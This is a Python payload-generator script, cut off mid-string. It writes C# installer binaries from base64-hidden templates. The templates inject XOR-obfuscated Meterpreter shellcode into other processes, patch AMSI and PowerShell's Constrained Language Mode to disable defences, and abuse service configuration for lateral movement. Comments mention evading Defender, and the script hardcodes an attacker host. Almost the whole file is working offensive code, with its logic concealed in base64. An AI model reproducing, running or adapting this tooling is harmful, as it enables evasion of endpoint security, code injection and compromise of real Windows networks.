import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makefodhelper import chararray
from makerunner import gen,runner,cradleps1,powershell_b64encode,makeoneliner
from makedll import writedll,cradledll,xor_buffer_csharp

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

devhost = "192.168.135.7"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writerunspace(lhost,lport,ptype,bitness,uacbypass,direct,pscmd,binary,targethost,listenhost,pipename):
    rsfilename = "Runspace.cs"

    if binary != "0":
        if binary == "Inject":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwoKbmFtZXNwYWNlIEJ5cGFzcwp7CiAgICBjbGFzcyBQcm9ncmFtCiAgICB7CiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byBjb25maWd1cmUgV2luZG93cy4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CiAgICAgICAgfQogICAgfQoKICAgIFtTeXN0ZW0uQ29tcG9uZW50TW9kZWwuUnVuSW5zdGFsbGVyKHRydWUpXQogICAgcHVibGljIGNsYXNzIFNhbXBsZSA6IFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGwuSW5zdGFsbGVyCiAgICB7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4TnVtYShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCBVSW50MzIgZmxBbGxvY2F0aW9uVHlwZSwgVUludDMyIGZsUHJvdGVjdCwgVUludDMyIG5uZFByZWZlcnJlZCk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblByb2Nlc3ModWludCBwcm9jZXNzQWNjZXNzLCBib29sIGJJbmhlcml0SGFuZGxlLCBpbnQgcHJvY2Vzc0lkKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXgoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEJhc2VBZGRyZXNzLCBieXRlW10gbHBCdWZmZXIsIEludDMyIG5TaXplLCBvdXQgSW50UHRyIGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4pOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVJlbW90ZVRocmVhZChJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsIHVpbnQgZHdTdGFja1NpemUsIEludFB0ciBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgICAgICBwdWJsaWMgb3ZlcnJpZGUgdm9pZCBVbmluc3RhbGwoU3lzdGVtLkNvbGxlY3Rpb25zLklEaWN0aW9uYXJ5IHNhdmVkU3RhdGUpCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLi4uIERvIG5vdCB0dXJuIG9mZiB5b3VyIGNvbXB1dGVyLiIpOwogICAgICAgICAgICBJbnRQdHIgbWVtID0gVmlydHVhbEFsbG9jRXhOdW1hKEdldEN1cnJlbnRQcm9jZXNzKCksIEludFB0ci5aZXJvLCAweDEwMDAsIDB4MzAwMCwgMHg0LCAwKTsKICAgICAgICAgICAgaWYgKG1lbSA9PSBudWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0="
            mid = "ICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaW50IHNpemUgPSBidWYuTGVuZ3RoOw=="
            lower = "ICAgICAgICAgICAgaW50IHBpZCA9IGV4cFByb2NbMF0uSWQ7CgogICAgICAgICAgICBJbnRQdHIgaFByb2Nlc3MgPSBPcGVuUHJvY2VzcygweDAwMUYwRkZGLCBmYWxzZSwgcGlkKTsKCiAgICAgICAgICAgIEludFB0ciBhZGRyID0gVmlydHVhbEFsbG9jRXgoaFByb2Nlc3MsIEludFB0ci5aZXJvLCAweDEwMDAsIDB4MzAwMCwgMHg0MCk7CgogICAgICAgICAgICBJbnRQdHIgb3V0U2l6ZTsKICAgICAgICAgICAgV3JpdGVQcm9jZXNzTWVtb3J5KGhQcm9jZXNzLCBhZGRyLCBidWYsIGJ1Zi5MZW5ndGgsIG91dCBvdXRTaXplKTsKCiAgICAgICAgICAgIEludFB0ciBoVGhyZWFkID0gQ3JlYXRlUmVtb3RlVGhyZWFkKGhQcm9jZXNzLCBJbnRQdHIuWmVybywgMCwgYWRkciwgSW50UHRyLlplcm8sIDAsIEludFB0ci5aZXJvKTsKICAgICAgICB9CiAgICB9Cn0="

            dproc = "Process[] expProc = Process.GetProcessesByName(\"%s\");" % pipename

            gen(lhost,lport,bitness,"csharp")
            msffilename = "met%s.csharp" % (bitness)
            m = open(msffilename,'r')
            msf = m.read()
            m.close()
            msf = xor_buffer_csharp(msf) # 5/26 -defender
            #msf_b64 = base64.b64encode(msf).decode()

            with open(rsfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                mid = base64.b64decode(mid).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + msf + "\n")
                f.write(mid + "\n")
                f.write("            " + dproc + "\n")
                f.write(lower)
            f.close()
        if binary == "BypassCLM":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlczsKCm5hbWVzcGFjZSBCeXBhc3MKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CiAgICAgICAgfQogICAgfQoKICAgIFtTeXN0ZW0uQ29tcG9uZW50TW9kZWwuUnVuSW5zdGFsbGVyKHRydWUpXQogICAgcHVibGljIGNsYXNzIFNhbXBsZSA6IFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGwuSW5zdGFsbGVyCiAgICB7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRTdGRIYW5kbGUoaW50IG5TdGRIYW5kbGUpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50UHRyIGR3U2l6ZSwgdWludCBmbE5ld1Byb3RlY3QsIG91dCB1aW50IGxwZmxPbGRQcm90ZWN0KTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CiAgICAgICAgcHVibGljIG92ZXJyaWRlIHZvaWQgVW5pbnN0YWxsKFN5c3RlbS5Db2xsZWN0aW9ucy5JRGljdGlvbmFyeSBzYXZlZFN0YXRlKQogICAgICAgIHsKICAgICAgICAgICAgLy8gRmluZCBhIHJlZmVyZW5jZSB0byB0aGUgYXV0b21hdGlvbiBhc3NlbWJseQogICAgICAgICAgICB2YXIgQXV0b21hdGlvbiA9IHR5cGVvZihTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFsaWdubWVudCkuQXNzZW1ibHk7CiAgICAgICAgICAgIC8vIEdldCBhIE1ldGhvZEluZm8gcmVmZXJlbmNlIHRvIHRoZSBHZXRTeXN0ZW1Mb2NrZG93blBvbGljeSBtZXRob2QKICAgICAgICAgICAgdmFyIGdldF9sb2NrZG93bl9pbmZvID0gQXV0b21hdGlvbi5HZXRUeXBlKCJTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlNlY3VyaXR5LlN5c3RlbVBvbGljeSIpLkdldE1ldGhvZCgiR2V0U3lzdGVtTG9ja2Rvd25Qb2xpY3kiLCBTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3MuUHVibGljIHwgU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzLlN0YXRpYyk7CiAgICAgICAgICAgIC8vIFJldHJpZXZlIGEgaGFuZGxlIHRvIHRoZSBtZXRob2QKICAgICAgICAgICAgdmFyIGdldF9sb2NrZG93bl9oYW5kbGUgPSBnZXRfbG9ja2Rvd25faW5mby5NZXRob2RIYW5kbGU7CiAgICAgICAgICAgIHVpbnQgbHBmbE9sZFByb3RlY3Q7CgogICAgICAgICAgICAvLyBUaGlzIGVuc3VyZXMgdGhlIG1ldGhvZCBpcyBKSVQgY29tcGlsZWQKICAgICAgICAgICAgUnVudGltZUhlbHBlcnMuUHJlcGFyZU1ldGhvZChnZXRfbG9ja2Rvd25faGFuZGxlKTsKICAgICAgICAgICAgLy8gR2V0IGEgcG9pbnRlciB0byB0aGUgY29tcGlsZWQgZnVuY3Rpb24KICAgICAgICAgICAgdmFyIGdldF9sb2NrZG93bl9wdHIgPSBnZXRfbG9ja2Rvd25faGFuZGxlLkdldEZ1bmN0aW9uUG9pbnRlcigpOwoKICAgICAgICAgICAgLy8gRW5zdXJlIHdlIGNhbiB3cml0ZSB0byB0aGUgYWRkcmVzcwogICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChnZXRfbG9ja2Rvd25fcHRyLCBuZXcgVUludFB0cig0KSwgMHg0MCwgb3V0IGxwZmxPbGRQcm90ZWN0KTsKCiAgICAgICAgICAgIC8vIFdyaXRlIHRoZSBpbnN0cnVjdGlvbnMgIm1vdiByYXgsIDA7IHJldCIuIFRoaXMgcmV0dXJucyAwLCB3aGljaCBpcyB0aGUgc2FtZSBhcyByZXR1cm5pbmcgU3lzdGVtRW5mb3JjZW1lbnRNb2RlLk5vbmUKICAgICAgICAgICAgdmFyIG5ld19pbnN0ciA9IG5ldyBieXRlW10geyAweDQ4LCAweDMxLCAweGMwLCAweGMzIH07CiAgICAgICAgICAgIE1hcnNoYWwuQ29weShuZXdfaW5zdHIsIDAsIGdldF9sb2NrZG93bl9wdHIsIDQpOwoKICAgICAgICAgICAgLy8ga2lsbCBhbXNpCiAgICAgICAgICAgIFN0cmluZyBtaW1pZGxsID0gImFtIiArICJzaS5kIiArICJsbCI7CiAgICAgICAgICAgIFN0cmluZyBtaW1pYnVmID0gIkFtIiArICJzaVNjYW4iICsgIkJ1IiArICJmZmVyIjsKICAgICAgICAgICAgdmFyIG1pbWkgPSBMb2FkTGlicmFyeShtaW1pZGxsKTsKICAgICAgICAgICAgdmFyIG1pbWlidWZmZXIgPSBHZXRQcm9jQWRkcmVzcyhtaW1pLCBtaW1pYnVmKTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QobWltaWJ1ZmZlciwgbmV3IFVJbnRQdHIoOCksIDB4NDAsIG91dCBscGZsT2xkUHJvdGVjdCk7CgogICAgICAgICAgICBpZiAoU3lzdGVtLkludFB0ci5TaXplID09IDgpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsRV9JTlZBTElEQVJHCiAgICAgICAgICAgICAgICAvLyByZXQKICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShuZXcgYnl0ZVtdIHsgMHhCOCwgMHg1NywgMHgwMCwgMHgwNywgMHg4MCwgMHhDMyB9LCAwLCBtaW1pYnVmZmVyLCA2KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsRV9JTlZBTElEQVJHCiAgICAgICAgICAgICAgICAvLyByZXQgMTgKICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShuZXcgYnl0ZVtdIHsgMHhCOCwgMHg1NywgMHgwMCwgMHgwNywgMHg4MCwgMHhDMiwgMHgxOCwgMHgwMCB9LCAwLCBtaW1pYnVmZmVyLCA4KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gUnVuIHBvd2Vyc2hlbGwgZnJvbSB0aGUgY3VycmVudCBwcm9jZXNzICh3b24ndCBzdGFydCBwb3dlcnNoZWxsLmV4ZSwgYnV0IHJ1biBmcm9tIHRoZSBwb3dlcnNoZWxsIC5OZXQgbGlicmFyaWVzKQogICAgICAgICAgICBNaWNyb3NvZnQuUG93ZXJTaGVsbC5Db25zb2xlU2hlbGwuU3RhcnQoU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMuUnVuc3BhY2VDb25maWd1cmF0aW9uLkNyZWF0ZSgpLCAiU3RhcnRvIiwgIkhlbHAiLCBuZXcgc3RyaW5nW10gewogICAgICAgICAgICAgICAgIi1leGVjIiwgImJ5cGFzcyIsICItbm9wIgogICAgICAgICAgICB9KTsKICAgICAgICB9CiAgICB9Cn0="
            with open(rsfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                f.write(upper + "\n")
            f.close()
        if binary == "Lat":
            #service -> pipename
            #binary -> pscmd
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKCm5hbWVzcGFjZSBCeXBhc3MKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuIERvIG5vdCB0dXJuIG9mZiB5b3VyIGNvbXB1dGVyLiIpOwogICAgICAgIH0KICAgIH0KCiAgICBbU3lzdGVtLkNvbXBvbmVudE1vZGVsLlJ1bkluc3RhbGxlcih0cnVlKV0KICAgIHB1YmxpYyBjbGFzcyBTYW1wbGUgOiBTeXN0ZW0uQ29uZmlndXJhdGlvbi5JbnN0YWxsLkluc3RhbGxlcgogICAgewogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEJlc3RGaXRNYXBwaW5nID0gZmFsc2UsIFRocm93T25Vbm1hcHBhYmxlQ2hhciA9IHRydWUpXQogICAgICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgICAgIGludGVybmFsIHN0YXRpYyBleHRlcm4gYm9vbCBMb2dvblVzZXIoCiAgICAgICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFN0cildIHN0cmluZyBscHN6VXNlcm5hbWUsCiAgICAgICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFN0cildIHN0cmluZyBscHN6RG9tYWluLAogICAgICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBTdHIpXSBzdHJpbmcgbHBzelBhc3N3b3JkLAogICAgICAgICAgICBpbnQgZHdMb2dvblR5cGUsCiAgICAgICAgICAgIGludCBkd0xvZ29uUHJvdmlkZXIsCiAgICAgICAgICAgIHJlZiBJbnRQdHIgcGhUb2tlbgogICAgICAgICAgICApOwoKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgSW1wZXJzb25hdGVMb2dnZWRPblVzZXIoSW50UHRyIGhUb2tlbik7CgogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgUXVlcnlTZXJ2aWNlQ29uZmlnKEludFB0ciBzZXJ2aWNlLCBJbnRQdHIgcXVlcnlTZXJ2aWNlQ29uZmlnLCBpbnQgYnVmZmVyU2l6ZSwgcmVmIGludCBieXRlc05lZWRlZCk7CgogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiT3BlblNDTWFuYWdlclciLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5TQ01hbmFnZXIoc3RyaW5nIG1hY2hpbmVOYW1lLCBzdHJpbmcgZGF0YWJhc2VOYW1lLCB1aW50IGR3QWNjZXNzKTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblNlcnZpY2UoSW50UHRyIGhTQ01hbmFnZXIsIHN0cmluZyBscFNlcnZpY2VOYW1lLCB1aW50IGR3RGVzaXJlZEFjY2Vzcyk7CgogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiQ2hhbmdlU2VydmljZUNvbmZpZyIpXQogICAgICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2hhbmdlU2VydmljZUNvbmZpZ0EoSW50UHRyIGhTZXJ2aWNlLCB1aW50IGR3U2VydmljZVR5cGUsIGludCBkd1N0YXJ0VHlwZSwgaW50IGR3RXJyb3JDb250cm9sLCBzdHJpbmcgbHBCaW5hcnlQYXRoTmFtZSwgc3RyaW5nIGxwTG9hZE9yZGVyR3JvdXAsIHN0cmluZyBscGR3VGFnSWQsIHN0cmluZyBscERlcGVuZGVuY2llcywgc3RyaW5nIGxwU2VydmljZVN0YXJ0TmFtZSwgc3RyaW5nIGxwUGFzc3dvcmQsIHN0cmluZyBscERpc3BsYXlOYW1lKTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFN0YXJ0U2VydmljZShJbnRQdHIgaFNlcnZpY2UsIGludCBkd051bVNlcnZpY2VBcmdzLCBzdHJpbmdbXSBscFNlcnZpY2VBcmdWZWN0b3JzKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBHZXRMYXN0RXJyb3IoKTsKICAgICAgICBwdWJsaWMgZW51bSBBQ0NFU1NfTUFTSyA6IHVpbnQKICAgICAgICB7CiAgICAgICAgICAgIFNUQU5EQVJEX1JJR0hUU19SRVFVSVJFRCA9IDB4MDAwRjAwMDAsCiAgICAgICAgICAgIFNUQU5EQVJEX1JJR0hUU19SRUFEID0gMHgwMDAyMDAwMCwKICAgICAgICAgICAgU1RBTkRBUkRfUklHSFRTX1dSSVRFID0gMHgwMDAyMDAwMCwKICAgICAgICAgICAgU1RBTkRBUkRfUklHSFRTX0VYRUNVVEUgPSAweDAwMDIwMDAwLAogICAgICAgIH0KCiAgICAgICAgcHVibGljIGVudW0gU0NNX0FDQ0VTUyA6IHVpbnQKICAgICAgICB7CiAgICAgICAgICAgIFNDX01BTkFHRVJfQ09OTkVDVCA9IDB4MDAwMDEsCiAgICAgICAgICAgIFNDX01BTkFHRVJfQ1JFQVRFX1NFUlZJQ0UgPSAweDAwMDAyLAogICAgICAgICAgICBTQ19NQU5BR0VSX0VOVU1FUkFURV9TRVJWSUNFID0gMHgwMDAwNCwKICAgICAgICAgICAgU0NfTUFOQUdFUl9MT0NLID0gMHgwMDAwOCwKICAgICAgICAgICAgU0NfTUFOQUdFUl9RVUVSWV9MT0NLX1NUQVRVUyA9IDB4MDAwMTAsCiAgICAgICAgICAgIFNDX01BTkFHRVJfTU9ESUZZX0JPT1RfQ09ORklHID0gMHgwMDAyMCwKICAgICAgICAgICAgU0NfTUFOQUdFUl9BTExfQUNDRVNTID0gQUNDRVNTX01BU0suU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfQ09OTkVDVCB8CiAgICAgICAgICAgICAgICBTQ19NQU5BR0VSX0NSRUFURV9TRVJWSUNFIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfRU5VTUVSQVRFX1NFUlZJQ0UgfAogICAgICAgICAgICAgICAgU0NfTUFOQUdFUl9MT0NLIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfUVVFUllfTE9DS19TVEFUVVMgfAogICAgICAgICAgICAgICAgU0NfTUFOQUdFUl9NT0RJRllfQk9PVF9DT05GSUcsCgogICAgICAgICAgICBHRU5FUklDX1JFQUQgPSBBQ0NFU1NfTUFTSy5TVEFOREFSRF9SSUdIVFNfUkVBRCB8CiAgICAgICAgICAgICAgICBTQ19NQU5BR0VSX0VOVU1FUkFURV9TRVJWSUNFIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfUVVFUllfTE9DS19TVEFUVVMsCgogICAgICAgICAgICBHRU5FUklDX1dSSVRFID0gQUNDRVNTX01BU0suU1RBTkRBUkRfUklHSFRTX1dSSVRFIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfQ1JFQVRFX1NFUlZJQ0UgfAogICAgICAgICAgICAgICAgU0NfTUFOQUdFUl9NT0RJRllfQk9PVF9DT05GSUcsCgogICAgICAgICAgICBHRU5FUklDX0VYRUNVVEUgPSBBQ0NFU1NfTUFTSy5TVEFOREFSRF9SSUdIVFNfRVhFQ1VURSB8CiAgICAgICAgICAgICAgICBTQ19NQU5BR0VSX0NPTk5FQ1QgfCBTQ19NQU5BR0VSX0xPQ0ssCgogICAgICAgICAgICBHRU5FUklDX0FMTCA9IFNDX01BTkFHRVJfQUxMX0FDQ0VTUywKICAgICAgICB9CiAgICAgICAgcHVibGljIGVudW0gU0VSVklDRV9BQ0NFU1MgOiB1aW50CiAgICAgICAgewogICAgICAgICAgICBTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgPSAweEYwMDAwLAogICAgICAgICAgICBTRVJWSUNFX1FVRVJZX0NPTkZJRyA9IDB4MDAwMDEsCiAgICAgICAgICAgIFNFUlZJQ0VfQ0hBTkdFX0NPTkZJRyA9IDB4MDAwMDIsCiAgICAgICAgICAgIFNFUlZJQ0VfUVVFUllfU1RBVFVTID0gMHgwMDAwNCwKICAgICAgICAgICAgU0VSVklDRV9FTlVNRVJBVEVfREVQRU5ERU5UUyA9IDB4MDAwMDgsCiAgICAgICAgICAgIFNFUlZJQ0VfU1RBUlQgPSAweDAwMDEwLAogICAgICAgICAgICBTRVJWSUNFX1NUT1AgPSAweDAwMDIwLAogICAgICAgICAgICBTRVJWSUNFX1BBVVNFX0NPTlRJTlVFID0gMHgwMDA0MCwKICAgICAgICAgICAgU0VSVklDRV9JTlRFUlJPR0FURSA9IDB4MDAwODAsCiAgICAgICAgICAgIFNFUlZJQ0VfVVNFUl9ERUZJTkVEX0NPTlRST0wgPSAweDAwMTAwLAogICAgICAgICAgICBTRVJWSUNFX0FMTF9BQ0NFU1MgPSAoU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU0VSVklDRV9RVUVSWV9DT05GSUcgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX0NIQU5HRV9DT05GSUcgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1FVRVJZX1NUQVRVUyB8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfRU5VTUVSQVRFX0RFUEVOREVOVFMgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1NUQVJUIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU0VSVklDRV9TVE9QIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU0VSVklDRV9QQVVTRV9DT05USU5VRSB8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfSU5URVJST0dBVEUgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1VTRVJfREVGSU5FRF9DT05UUk9MKQogICAgICAgIH0KICAgICAgICBwcml2YXRlIHN0cnVjdCBRdWVyeVNlcnZpY2VDb25maWdTdHJ1Y3QKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBpbnQgc2VydmljZVR5cGU7CiAgICAgICAgICAgIHB1YmxpYyBpbnQgc3RhcnRUeXBlOwogICAgICAgICAgICBwdWJsaWMgaW5